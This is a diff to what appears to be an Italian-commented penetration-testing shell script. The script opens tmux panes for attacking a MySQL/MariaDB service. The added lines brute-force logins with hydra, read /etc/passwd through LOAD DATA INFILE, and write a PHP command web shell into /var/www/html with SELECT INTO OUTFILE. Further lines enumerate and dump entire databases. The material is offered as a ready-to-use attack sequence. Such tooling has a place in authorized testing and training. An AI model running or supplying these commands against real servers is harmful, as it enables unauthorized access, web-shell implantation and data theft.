@@ -2668,10 +2668,20 @@ tmux split-window -h -t "30.9"
 # Esecuzione dei comandi nelle sottofinestre
 tmux send-keys -t PT:30.0 "# Mysql/MariaDB: service fingerprint" Enter
 tmux send-keys -t PT:30.0 "nmap -sV -Pn -vv --script=mysql-* $ip -p 3306 -o out.3306"
-tmux send-keys -t PT:30.0 "# Mysql/MariaDB: verify Credentials" Enter
-tmux send-keys -t PT:30.0 "hydra -L users.txt -P passwords.txt -f mysql://$ip:3306 && hydra -L users.txt -P pusers.txt -f mysql://$ip:3306 && hydra -l '' -p '' -f mysql://$ip:3306 && hydra -l 'dontknow' -p '' -f mysql://$ip:3306"
-tmux send-keys -t PT:30.0 "# Mysql/MariaDB: Access DB" Enter
-tmux send-keys -t PT:30.0 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
+tmux send-keys -t PT:30.1 "# Mysql/MariaDB: verify Credentials" Enter
+tmux send-keys -t PT:30.1 "hydra -L users.txt -P passwords.txt -f mysql://$ip:3306 && hydra -L users.txt -P pusers.txt -f mysql://$ip:3306 && hydra -l '' -p '' -f mysql://$ip:3306 && hydra -l 'dontknow' -p '' -f mysql://$ip:3306"
+tmux send-keys -t PT:30.2 "# Mysql/MariaDB: Access DB" Enter
+tmux send-keys -t PT:30.2 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
+tmux send-keys -t PT:30.3 "printf \"\n# Mysql/MariaDB: Useful information from DB\n# View parameters describing the current state of the server\n mysql> show status;\n# View the user I am connected to the database with\n mysql> select user();\n# I see what rights my user has\n mysql> SHOW GRANTS FOR 'nomeutente'@'localhost';\n\n\" " Enter
+tmux send-keys -t PT:30.3 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
+tmux send-keys -t PT:30.4 "printf \"\n# Mysql/MariaDB: Read File \n mysql> CREATE TABLE temp_file (line TEXT);\n mysql> LOAD DATA INFILE '/etc/passwd' INTO TABLE temp_file FIELDS TERMINATED BY;\n\n\" " Enter
+tmux send-keys -t PT:30.4 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
+tmux send-keys -t PT:30.5 "printf \"\n# Mysql/MariaDB: Write File\n mysql> SELECT \"<?php system(\\\$_GET['cmd']); ?>\" INTO OUTFILE '/var/www/html/shell.php';\n\n\" " Enter
+tmux send-keys -t PT:30.5 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
+tmux send-keys -t PT:30.6 "printf \"\n# Mysql/MariaDB: Get info from DB\n# Get all databases\n mysql> show databases;\n# Get all tables of a specific DB\n# mysql> use <DATABASE>\n# mysql> show tables;\n# Get table structure\n mysql> describe <nome tabella>;\n# Get tables data\n mysql> select * from tables;\n# Exit from DB\n mysql> exit\n# Dump whole database\n# mysqldump -h $ip -P 3306 -u USER -p --single-transaction --routines --triggers --databases <DB_NAME> > backup.sql
+\n\n\" " Enter
+tmux send-keys -t PT:30.6 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
+
 cd $folderProject
 
 # Attivazione della modalità interattiva
